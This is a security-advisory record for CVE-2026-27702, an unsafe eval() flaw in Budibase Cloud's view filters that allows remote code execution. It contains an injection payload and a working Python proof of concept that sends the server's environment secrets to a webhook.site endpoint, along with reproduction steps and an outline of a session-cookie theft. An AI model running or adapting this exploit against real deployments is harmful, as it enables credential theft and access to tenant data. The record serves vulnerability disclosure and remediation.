@@ -1,0 +1,243 @@
+advisory_id: GHSA-rvhr-26g4-p2r8
+datasource_id: github_osv/GHSA-rvhr-26g4-p2r8
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/02/GHSA-rvhr-26g4-p2r8/GHSA-rvhr-26g4-p2r8.json
+aliases:
+  - CVE-2026-27702
+summary: |
+  Budibase: Remote Code Execution via Unsafe eval() in View Filter Map Function (Budibase Cloud)
+  ## Summary
+
+  A critical unsafe `eval()` vulnerability in Budibase's view filtering implementation allows any authenticated user (including free tier accounts) to execute arbitrary JavaScript code on the server. **This vulnerability ONLY affects Budibase Cloud (SaaS)** - self-hosted deployments use native CouchDB views and are not vulnerable. The vulnerability exists in `packages/server/src/db/inMemoryView.ts` where user-controlled view map functions are directly evaluated without sanitization.
+
+  The primary impact comes from what lives inside the pod's environment: the `app-service` pod runs with **secrets baked into its environment variables**, including `INTERNAL_API_KEY`, `JWT_SECRET`, CouchDB admin credentials, AWS keys, and more. Using the extracted CouchDB credentials, we verified direct database access, enumerated all tenant databases, and confirmed that user records (email addresses) are readable.
+
+  ## Details
+
+  ### Root Cause
+
+  File: `packages/server/src/db/inMemoryView.ts:28`
+
+  ```javascript
+  export async function runView(
+    view: DBView,
+    calculation: string,
+    group: boolean,
+    data: Row[]
+  ) {
+    // ...
+    let fn = (doc: Document, emit: any) => emit(doc._id)
+    // BUDI-7060 -> indirect eval call appears to cause issues in cloud
+    eval("fn = " + view?.map?.replace("function (doc)", "function (doc, emit)"))  // UNSAFE EVAL
+    // ...
+  }
+  ```
+
+  **Why Only Cloud is Vulnerable:**
+
+  File: `packages/server/src/sdk/workspace/rows/search/internal/internal.ts:194-221`
+
+  ```typescript
+  if (env.SELF_HOSTED) {
+    // Self-hosted: Uses native CouchDB design documents - NO EVAL
+    response = await db.query(`database/${viewName}`, {
+      include_docs: !calculation,
+      group: !!group,
+    })
+  } else {
+    // Cloud: Uses in-memory PouchDB with UNSAFE EVAL
+    const tableId = viewInfo.meta!.tableId
+    const data = await fetchRaw(tableId!)
+    response = await inMemoryViews.runView(  // <- Calls vulnerable function
+      viewInfo,
+      calculation as string,
+      !!group,
+      data
+    )
+  }
+  ```
+
+  The `view.map` parameter comes directly from user input when creating table views with filters. The code constructs a string by concatenating `"fn = "` with the user-controlled map function and passes it to `eval()`, allowing arbitrary JavaScript execution in the Node.js server context.
+
+  **Self-hosted deployments are not affected** because they use native CouchDB design documents instead of the in-memory eval() path.
+
+  ### Attack Flow
+
+  1. Authenticated user creates a table view with custom filter
+  2. Frontend sends POST request to `/api/views` with malicious payload in filter value
+  3. Backend stores view configuration in CouchDB
+  4. When view is queried (GET `/api/views/{viewName}`), `runView()` is called
+  5. Malicious code is `eval()`'d on server - RCE achieved
+
+  ### Exploitation Vector
+
+  The vulnerability is triggered via the view filter mechanism. When creating a view with a filter condition, the filter value can be injected with JavaScript code that breaks out of the intended expression context:
+
+  **Malicious filter value:**
+  ```javascript
+  x" || (MALICIOUS_CODE_HERE, true) || "
+  ```
+
+  This payload:
+  - Closes the expected string context with `x"`
+  - Uses `||` (OR operator) to inject arbitrary code
+  - Returns `true` to make the filter always match
+  - Closes with `|| ""` to maintain valid syntax
+
+  ### Verified on Production
+
+  Tested on own Budibase Cloud account (y4ylfy7m.budibase.app,) to confirm severity. Testing was deliberately limited - no customer data was retained and exploitation was stopped once impact was confirmed:
+  - Achieved RCE on `app-service` pod (hostname: `app-service-5f4f6d796d-p6dhz`, Kubernetes, `eu-west-1`)
+  - Extracted `process.env` - confirmed presence of platform secrets (`JWT_SECRET`, `INTERNAL_API_KEY`, `COUCH_DB_URL`, `MINIO_ACCESS_KEY`, etc.)
+  - Used extracted `COUCH_DB_URL` credentials to verify CouchDB access - enumerated database list (489,827 databases) to confirm scale of impact
+  - Queried users table to confirm data is readable (retrieved email addresses)
+  - Uploaded an HTML file as a PoC artifact to confirm write access.
+
+
+
+
+
+  ## Proof of Concept
+
+  ### PoC Script
+
+  ```python
+  import requests, time
+  from urllib.parse import urlparse
+
+  # Config | CHANGE THESE
+  URL = "https://[YOUR-TENANT].budibase.app"
+  WEBHOOK = "https://webhook.site/[YOUR-WEBHOOK-ID]"
+  JWT = "[YOUR-JWT-TOKEN]"          # budibase:auth cookie value
+  APP_ID = "app_dev_[TENANT]_[APP-UUID]"  # x-budibase-app-id header
+  TABLE_ID = "[YOUR-TABLE-ID]"      # any table ID (e.g. ta_users)
+
+  # Payload - parses hostname/path from WEBHOOK automatically
+  webhook_parsed = urlparse(WEBHOOK)
+  view = f"RCE_{int(time.time())}"
+  payload = f'''x" || (require('https').request({{hostname:'{webhook_parsed.hostname}',path:'{webhook_parsed.path}',method:'POST'}}).end(JSON.stringify(process.env)), true) || "'''
+
+  # Exploit
+  s = requests.Session()
+  s.cookies.set('budibase:auth', JWT)
+  s.headers.update({"x-budibase-app-id": APP_ID, "Content-Type": "application/json"})
+
+  print(f"[*] Creating view...")
+  s.post(f"{URL}/api/views", json={"tableId": TABLE_ID, "name": view, "filters": [{"key": "email", "condition": "EQUALS", "value": payload}]})
+
+  print(f"[*] Triggering RCE...")
+  s.get(f"{URL}/api/views/{view}")
+
+  print(f"[+] Done! Check: {WEBHOOK}")
+  ```
+
+  ### Video Demo
+  https://github.com/user-attachments/assets/cd12e1ab-02fd-4d0d-9fb5-d78bb83cdf99
+
+
+  ### Reproduction Steps
+
+  1. **Prerequisites:**
+     - Create free Budibase Cloud account at https://budibase.app
+     - Create a new app
+     - Create a table with at least one text field
+
+  2. **Exploitation:**
+     - Copy the PoC script above
+     - Replace placeholders with your tenant URL, app ID, table ID
+     - Get your JWT token from browser cookies (`budibase:auth`)
+     - Create a webhook at https://webhook.site for exfiltration
+     - Run the script: `python3 budibase_rce_poc.py`
+
+  3. **Verification:**
+     - Check webhook.site - you'll receive all server environment variables
+     - Extracted data includes JWT_SECRET, INTERNAL_API_KEY, database credentials
+
+  ## Additional Note
+
+  The `budibase:auth` session cookie has `Domain=.budibase.app` (leading dot = all subdomains) and no `HttpOnly` flag, making it readable by JavaScript. Since the RCE allows uploading arbitrary HTML files to any subdomain (as demonstrated with the PoC artifact), an attacker could serve an XSS payload from their own tenant subdomain and steal session cookies from any Budibase Cloud user who visits that page (one click ATO).
+
+  ## Responsible Disclosure Statement
+
+  This vulnerability was discovered during independent security research. Testing was conducted on a personal free-tier account only. Exploitation was deliberately limited to what was necessary to confirm the vulnerability and its impact:
+
+  - No customer data was accessed beyond enumerating database names and confirming that user records (email addresses) are readable
+  - The PoC HTML file uploaded to confirm write access is benign
+  - This report is being submitted directly to Budibase security with no plans for public disclosure until a fix is in place
+  - **Before any public disclosure, this report must be redacted/simplified** - all credentials, hostnames, internal API keys, tenant IDs, and other sensitive platform details included here for Budibase's remediation purposes must be removed or redacted
+impacted_packages:
+  - purl: pkg:npm/budibase
+    affected_versions: vers:npm/<3.30.4
+    fixed_versions: vers:npm/3.30.4
+    affected_packages:
+      - pkg:npm/budibase@0.0.3
+      - pkg:npm/budibase@0.0.7
+      - pkg:npm/budibase@0.0.8
+      - pkg:npm/budibase@0.0.9
+      - pkg:npm/budibase@0.0.10
+      - pkg:npm/budibase@0.0.11
+      - pkg:npm/budibase@0.0.12
+      - pkg:npm/budibase@0.0.13
+      - pkg:npm/budibase@0.0.14
+      - pkg:npm/budibase@0.0.15
+      - pkg:npm/budibase@0.0.17
+      - pkg:npm/budibase@0.0.18
+      - pkg:npm/budibase@0.0.19
+      - pkg:npm/budibase@0.0.20
+      - pkg:npm/budibase@0.0.21
+      - pkg:npm/budibase@0.0.22
+      - pkg:npm/budibase@0.0.23
+      - pkg:npm/budibase@0.0.24
+      - pkg:npm/budibase@0.0.27
+      - pkg:npm/budibase@0.0.28
+      - pkg:npm/budibase@0.0.29
+      - pkg:npm/budibase@0.0.30
+      - pkg:npm/budibase@0.0.31
+    fixed_packages:
+      - pkg:npm/budibase@3.30.4
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:github/budibase/budibase
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/budibase/budibase
+        commit: 348659810cf930dda5f669e782706594c547115d
+        patch_text:
+    introduced_in_commits: []
+severities:
+  - score: '9.9'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:L
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/02/GHSA-rvhr-26g4-p2r8/GHSA-rvhr-26g4-p2r8.json
+  - score: CRITICAL
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-94
+  - CWE-20
+  - CWE-95
+references:
+  - url: https://github.com/Budibase/budibase
+    reference_type:
+    reference_id:
+  - url: https://github.com/Budibase/budibase/commit/348659810cf930dda5f669e782706594c547115d
+    reference_type:
+    reference_id:
+  - url: https://github.com/Budibase/budibase/pull/18087
+    reference_type:
+    reference_id:
+  - url: https://github.com/Budibase/budibase/releases/tag/3.30.4
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-27702
+    reference_type:
+    reference_id: CVE-2026-27702
+  - url: https://github.com/Budibase/budibase/security/advisories/GHSA-rvhr-26g4-p2r8
+    reference_type:
+    reference_id: GHSA-rvhr-26g4-p2r8
+exploits: []
